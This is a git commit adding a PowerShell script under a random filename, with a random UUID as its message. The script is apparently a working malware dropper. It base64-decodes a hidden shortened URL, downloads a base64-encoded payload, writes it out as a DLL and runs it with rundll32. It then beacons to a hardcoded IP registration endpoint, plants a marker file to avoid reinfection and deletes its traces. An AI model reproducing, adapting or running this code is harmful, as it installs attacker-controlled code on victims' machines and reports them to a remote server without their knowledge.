c0bd457739a7e2e928ef9813880aa35f46e6c84b
9937287427322394 <65558780+9937287427322394@users.noreply.github.com>
2020-05-21 14:55:16 -0300

    9050e62e-59a3-4e08-89c6-a964ce23e184

---
+++ bc5f8cb1.ps1
@@ -0,0 +1,31 @@
+[Reflection.Assembly]::LoadWithPartialName("System.Security")
+$progressPreference = 'silentlyContinue'
+$pathLocal = [Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)
+foreach($item in [System.IO.Directory]::GetFiles($pathLocal)){
+if($item -like "*.cadmac*"){
+[Environment]::Exit(1)
+}
+}
+function Decrypt-String($String){
+$retorno = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($String))
+return $retorno
+}
+$encryptedUri = "aHR0cHM6Ly9pcy5nZC9GOE4wdFU="
+$dencryptedUri = Decrypt-String $encryptedUri
+$encryptedPath = "Qzpc"
+$dencryptedPath = Decrypt-String $encryptedPath
+$dencryptedPath = $dencryptedPath + [Environment]::UserName
+[System.IO.Directory]::CreateDirectory($dencryptedPath)
+$dencryptedPath = $dencryptedPath + "\" + [Environment]::UserName + ".txt"
+Invoke-WebRequest $dencryptedUri -OutFile $dencryptedPath
+$tempbytes = [System.Convert]::FromBase64String([System.IO.File]::ReadAllText($dencryptedPath))
+$dencryptedPath = $dencryptedPath -replace ".txt", ".dll"
+[System.IO.File]::WriteAllBytes($dencryptedPath, $tempbytes)
+rundll32.exe "$dencryptedPath,first"
+$encryptedUriCount = "aHR0cDovLzE4LjE0NC4yMy4xMjQvcmVnaXN0cmEucGhwP2E9Mg=="
+$dencryptedUriCount = Decrypt-String $encryptedUriCount
+$dencryptedPath = $dencryptedPath -replace ".dll", ".txt"
+Invoke-WebRequest $dencryptedUriCount
+$pathLocal = $pathLocal + "\.cadmac"
+[System.IO.File]::WriteAllText($pathLocal, "")
+Remove-Item $dencryptedPath
